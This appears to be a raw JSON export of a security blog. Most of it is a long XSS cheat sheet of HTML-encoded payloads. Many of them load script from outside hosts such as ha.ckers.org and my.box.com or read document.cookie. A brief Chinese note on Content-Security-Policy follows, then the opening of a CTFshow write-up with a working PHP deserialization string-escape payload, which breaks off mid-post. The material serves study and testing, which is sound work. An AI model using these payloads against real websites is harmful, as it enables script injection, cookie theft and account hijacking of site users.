STYLE=\\&quot;xss&amp;#58;expression(alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;exp/*&amp;lt;A STYLE=&#x27;no\\xss&amp;#58;noxss(\\&quot;*//*\\&quot;);xss&amp;#58;ex&amp;#x2F;*XSS*//*/*/pression(alert(\\&quot;XSS\\&quot;))&#x27;&amp;gt;&amp;lt;STYLE TYPE=\\&quot;text/javascript\\&quot;&amp;gt;alert(&#x27;XSS&#x27;);&amp;lt;/STYLE&amp;gt;&amp;lt;STYLE&amp;gt;&amp;#46;XSS&#123;background-image&amp;#58;url(\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;);&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;STYLE type=\\&quot;text/css\\&quot;&amp;gt;BODY&#123;background&amp;#58;url(\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;)&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;!--&amp;#91;if gte IE 4&amp;#93;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&#x27;XSS&#x27;);&amp;lt;/SCRIPT&amp;gt;&amp;lt;!&amp;#91;endif&amp;#93;--&amp;gt;&amp;lt;BASE HREF=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);//\\&quot;&amp;gt;&amp;lt;OBJECT TYPE=\\&quot;text/x-scriptlet\\&quot; DATA=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\\&quot;&amp;gt;&amp;lt;/OBJECT&amp;gt;&amp;lt;OBJECT classid=clsid&amp;#58;ae24fdae-03c6-11d1-8b76-0080c744f389&amp;gt;&amp;lt;param name=url value=javascript&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;/OBJECT&amp;gt;&amp;lt;EMBED SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;swf\\&quot; AllowScriptAccess=\\&quot;always\\&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;&amp;lt;EMBED SRC=\\&quot;data&amp;#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\&quot; type=\\&quot;image/svg+xml\\&quot; AllowScriptAccess=\\&quot;always\\&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;a=\\&quot;get\\&quot;;b=\\&quot;URL(\\\\&quot;\\&quot;;c=\\&quot;javascript&amp;#058;\\&quot;;d=\\&quot;alert(&#x27;XSS&#x27;);\\\\&quot;)\\&quot;;eval(a+b+c+d);&amp;lt;HTML xmlns&amp;#58;xss&amp;gt;&amp;lt;?import namespace=\\&quot;xss\\&quot; implementation=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;htc\\&quot;&amp;gt;&amp;lt;xss&amp;#58;xss&amp;gt;XSS&amp;lt;/xss&amp;#58;xss&amp;gt;&amp;lt;/HTML&amp;gt;&amp;lt;XML ID=I&amp;gt;&amp;lt;X&amp;gt;&amp;lt;C&amp;gt;&amp;lt;!&amp;#91;CDATA&amp;#91;&amp;lt;IMG SRC=\\&quot;javas&amp;#93;&amp;#93;&amp;gt;&amp;lt;!&amp;#91;CDATA&amp;#91;cript&amp;#58;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;#93;&amp;#93;&amp;gt;&amp;lt;/C&amp;gt;&amp;lt;/X&amp;gt;&amp;lt;/xml&amp;gt;&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;XML ID=\\&quot;xss\\&quot;&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=\\&quot;javas&amp;lt;!-- --&amp;gt;cript&amp;#58;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;&amp;lt;SPAN DATASRC=\\&quot;#xss\\&quot; DATAFLD=\\&quot;B\\&quot; DATAFORMATAS=\\&quot;HTML\\&quot;&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;XML SRC=\\&quot;xsstest&amp;#46;xml\\&quot; ID=I&amp;gt;&amp;lt;/XML&amp;gt;&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;&amp;lt;?xml&amp;#58;namespace prefix=\\&quot;t\\&quot; ns=\\&quot;urn&amp;#58;schemas-microsoft-com&amp;#58;time\\&quot;&amp;gt;&amp;lt;?import namespace=\\&quot;t\\&quot; implementation=\\&quot;#default#time2\\&quot;&amp;gt;&amp;lt;t&amp;#58;set attributeName=\\&quot;innerHTML\\&quot; to=\\&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&amp;lt;SCRIPT SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;jpg\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;!--#exec cmd=\\&quot;/bin/echo &#x27;&amp;lt;SCR&#x27;\\&quot;--&amp;gt;&amp;lt;!--#exec cmd=\\&quot;/bin/echo &#x27;IPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js&amp;gt;&amp;lt;/SCRIPT&amp;gt;&#x27;\\&quot;--&amp;gt;&amp;lt;? echo(&#x27;&amp;lt;SCR)&#x27;;echo(&#x27;IPT&amp;gt;alert(\\&quot;XSS\\&quot;)&amp;lt;/SCRIPT&amp;gt;&#x27;); ?&amp;gt;&amp;lt;IMG SRC=\\&quot;http&amp;#58;//www&amp;#46;thesiteyouareon&amp;#46;com/somecommand&amp;#46;php?somevariables=maliciouscode\\&quot;&amp;gt;Redirect 302 /a&amp;#46;jpg http&amp;#58;//victimsite&amp;#46;com/admin&amp;#46;asp&amp;deleteuser&amp;lt;META HTTP-EQUIV=\\&quot;Set-Cookie\\&quot; Content=\\&quot;USERID=&amp;lt;SCRIPT&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;CONTENT-TYPE\\&quot; CONTENT=\\&quot;text/html; charset=UTF-7\\&quot;&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert(&#x27;XSS&#x27;);+ADw-/SCRIPT+AD4-&amp;lt;SCRIPT a=\\&quot;&amp;gt;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT =\\&quot;&amp;gt;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT a=\\&quot;&amp;gt;\\&quot; &#x27;&#x27; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT \\&quot;a=&#x27;&amp;gt;&#x27;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT a=`&amp;gt;` SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT a=\\&quot;&amp;gt;&#x27;&amp;gt;\\&quot; SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT&amp;gt;document&amp;#46;write(\\&quot;&amp;lt;SCRI\\&quot;);&amp;lt;/SCRIPT&amp;gt;PT SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//66&amp;#46;102&amp;#46;7&amp;#46;147/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//1113982867/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//0x42&amp;#46;0x0000066&amp;#46;0x7&amp;#46;0x93/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//0102&amp;#46;0146&amp;#46;0007&amp;#46;00000223/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;htt p&amp;#58;//6 6&amp;#46;000146&amp;#46;0x7&amp;#46;147/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;//www&amp;#46;google&amp;#46;com/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;//google\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org@google\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//google&amp;#58;ha&amp;#46;ckers&amp;#46;org\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//google&amp;#46;com/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//www&amp;#46;google&amp;#46;com&amp;#46;/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;javascript&amp;#058;document&amp;#46;location=&#x27;http&amp;#58;//www&amp;#46;google&amp;#46;com/&#x27;\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;A HREF=\\&quot;http&amp;#58;//www&amp;#46;gohttp&amp;#58;//www&amp;#46;google&amp;#46;com/ogle&amp;#46;com/\\&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;&amp;lt;%3C&amp;lt&amp;lt;&amp;LT&amp;LT;&amp;#60&amp;#060&amp;#0060&amp;#00060&amp;#000060&amp;#0000060&amp;lt;&amp;#x3c&amp;#x03c&amp;#x003c&amp;#x0003c&amp;#x00003c&amp;#x000003c&amp;#x3c;&amp;#x03c;&amp;#x003c;&amp;#x0003c;&amp;#x00003c;&amp;#x000003c;&amp;#X3c&amp;#X03c&amp;#X003c&amp;#X0003c&amp;#X00003c&amp;#X000003c&amp;#X3c;&amp;#X03c;&amp;#X003c;&amp;#X0003c;&amp;#X00003c;&amp;#X000003c;&amp;#x3C&amp;#x03C&amp;#x003C&amp;#x0003C&amp;#x00003C&amp;#x000003C&amp;#x3C;&amp;#x03C;&amp;#x003C;&amp;#x0003C;&amp;#x00003C;&amp;#x000003C;&amp;#X3C&amp;#X03C&amp;#X003C&amp;#X0003C&amp;#X00003C&amp;#X000003C&amp;#X3C;&amp;#X03C;&amp;#X003C;&amp;#X0003C;&amp;#X00003C;&amp;#X000003C;\\x3c\\x3C\\u003c\\u003C&amp;lt;iframe src=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html&amp;gt;&amp;lt;IMG SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;lt;SCRIPT SRC=//ha&amp;#46;ckers&amp;#46;org/&amp;#46;js&amp;gt;&amp;lt;SCRIPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js?&amp;lt;B&amp;gt;&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(\\&quot;XSS\\&quot;);//&amp;lt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;SCRIPT/SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;BODY onload!#$%&amp;()*~+-_&amp;#46;,&amp;#58;;?@&amp;#91;/|\\&amp;#93;^`=alert(\\&quot;XSS\\&quot;)&amp;gt;&amp;lt;SCRIPT/XSS SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;lt;IMG SRC=\\&quot; javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;perl -e &#x27;print \\&quot;&amp;lt;SCR\\0IPT&amp;gt;alert(\\\\&quot;XSS\\\\&quot;)&amp;lt;/SCR\\0IPT&amp;gt;\\&quot;;&#x27; &amp;gt; outperl -e &#x27;print \\&quot;&amp;lt;IMG SRC=java\\0script&amp;#058;alert(\\\\&quot;XSS\\\\&quot;)&amp;gt;\\&quot;;&#x27; &amp;gt; out&amp;lt;IMG SRC=\\&quot;jav&amp;#x0D;ascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;IMG SRC=\\&quot;jav&amp;#x0A;ascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;IMG SRC=\\&quot;jav&amp;#x09;ascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&amp;gt;&amp;lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(String&amp;#46;fromCharCode(88,83,83))&amp;gt;&amp;lt;IMG \\&quot;\\&quot;\\&quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\\&quot;XSS\\&quot;)&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&amp;lt;IMG SRC=`javascript&amp;#058;alert(\\&quot;RSnake says, &#x27;XSS&#x27;\\&quot;)`&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(&amp;quot;XSS&amp;quot;)&amp;gt;&amp;lt;IMG SRC=JaVaScRiPt&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG SRC=javascript&amp;#058;alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;SCRIPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js&amp;gt;&amp;lt;/SCRIPT&amp;gt;&#x27;&#x27;;!--\\&quot;&amp;lt;XSS&amp;gt;=&amp;&#123;()&#125;&#x27;;alert(String&amp;#46;fromCharCode(88,83,83))//\\&#x27;;alert(String&amp;#46;fromCharCode(88,83,83))//\\&quot;;alert(String&amp;#46;fromCharCode(88,83,83))//\\\\&quot;;alert(String&amp;#46;fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;\\&quot;&amp;gt;&#x27;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String&amp;#46;fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;&lt;IMG SRC=javascrscriptipt:alert(&#x27;XSS&#x27;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;IMG SRC=&quot; &amp;#14; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;\\&quot;;alert(&#x27;XSS&#x27;);//&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;�script�alert(�XSS�)�/script�&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;&lt;DIV STYLE=&quot;background-image:\\0075\\0072\\006C\\0028&#x27;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029&#x27;\\0029&quot;&gt;&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;&lt;STYLE&gt;@im\\port&#x27;\\ja\\vasc\\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;&gt;&lt;XSS STYLE=&quot;xss:expression(alert(&#x27;XSS&#x27;))&quot;&gt;exp/*&lt;A STYLE=&#x27;no\\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#x27;&gt;&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;a=&quot;get&quot;;b=&quot;URL(ja\\&quot;&quot;;c=&quot;vascr&quot;;d=&quot;ipt:ale&quot;;e=&quot;rt(&#x27;XSS&#x27;);\\&quot;)&quot;;eval(a+b+c+d+e);&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;form id=&quot;test&quot; /&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(123)&quot;&gt;TESTHTML5FORMACTION&lt;form&gt;&lt;button formaction=&quot;javascript:alert(123)&quot;&gt;crosssitespt&lt;frameset onload=alert(123)&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(123)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(123)//&quot;&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;(&#123;0:#0=alert/#0#/#0#(123)&#125;)&lt;/script&gt;&lt;script&gt;ReferenceError.prototype.__defineGetter__(&#x27;name&#x27;, function()&#123;alert(123)&#125;),x&lt;/script&gt;&lt;script&gt;Object.__noSuchMethod__ = Function,[&#123;&#125;][0].constructor._(&#x27;alert(1)&#x27;)()&lt;/script&gt;&lt;script src=&quot;#&quot;&gt;&#123;alert(1)&#125;&lt;/script&gt;;1&lt;script&gt;crypto.generateCRMFRequest(&#x27;CN=0&#x27;,0,0,null,&#x27;alert(1)&#x27;,384,null,&#x27;rsa-dual-use&#x27;)&lt;/script&gt;&lt;svg xmlns=&quot;#&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg onload=&quot;javascript:alert(123)&quot; xmlns=&quot;#&quot;&gt;&lt;/svg&gt;&lt;iframe xmlns=&quot;#&quot; src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-%253cscript%253ealert(document.cookie)%253c/script%253e&#x27;&gt;&lt;s&#x27;%2b&#x27;cript&gt;alert(document.cookie)&lt;/script&gt;&#x27;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;&#x27;&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;%22/%3E%3CBODY%20onload=&#x27;document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&#x27;%3E&#x27;; alert(document.cookie); var foo=&#x27;foo\\&#x27;; alert(document.cookie);//&#x27;;&lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;&lt;img src=asdf onerror=alert(document.cookie)&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))&lt;/script&gt;&lt;video src=1 onerror=alert(1)&gt;&lt;audio src=1 onerror=alert(1)&gt; CSPCSP（内容安全策略） 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。 CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。 作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。 &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://lazzzaro.github.io/tags/XSS/"}],"author":"Lazzaro"},{"title":"CTFshow 月饼杯","slug":"match-CTFshow-月饼杯","date":"2020-09-26T14:12:43.000Z","updated":"2020-09-29T12:25:47.035Z","comments":true,"path":"2020/09/26/match-CTFshow-月饼杯/","link":"","permalink":"https://lazzzaro.github.io/2020/09/26/match-CTFshow-%E6%9C%88%E9%A5%BC%E6%9D%AF/","excerpt":"","text":"​ 比赛：CTFshow 月饼杯 平台：https://ctf.show开始：2020/9/25 18:00结束：2020/9/27 18:00题目： web 杂项 密码 逆向 pwn 若干道规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：rank最高的师傅发月饼！rank最高的师傅发月饼！rank最高的师傅发月饼！ 出题：crypto1+crypto2+crypto3+misc1 ​ WEBweb1_此夜圆 一江春水何年尽，万古清光此夜圆 index.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;yu22x&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 反序列化字符逃逸。 正常序列化： 1234$uname=&#x27;FirebaskyFirebasky&#x27;;$password=&#x27;1&#x27;;$x=new a($uname,$password);echo serialize($x); 得到 O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:18:&quot;FirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; filter()函数会把其中的Firebasky替换为Firebaskyup，而字符串对应的长度值不变，即 O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:18:&quot;FirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; 在unserialize()反序列化时，字符长度与原始值不一致会反序列化失败，尝试把多出来的部分构造为需要的password值，既保证反序列化正常执行，又能将原始无用的后半部分“挤出去”。 构造&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;（长度：30） 即 1234$uname=&#x27;FirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;;$password=&#x27;1&#x27;;$x=new a($uname,$password);echo serialize($x); filter()函数替换后得到 O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:48:&quot;FirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; 由于FirebaskyupFirebaskyup不足48长度，反序列化失败，可以增加构造的Firebasky，假设要构造 $x$ 个Firebasky，则有 $9x+30=(9+2)x$，解得 $x=15$。 PAYLOAD: ?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; ​ web2_故人心 三五夜中新月色，二千里外故人心 Hint: 存在一个robots.txt 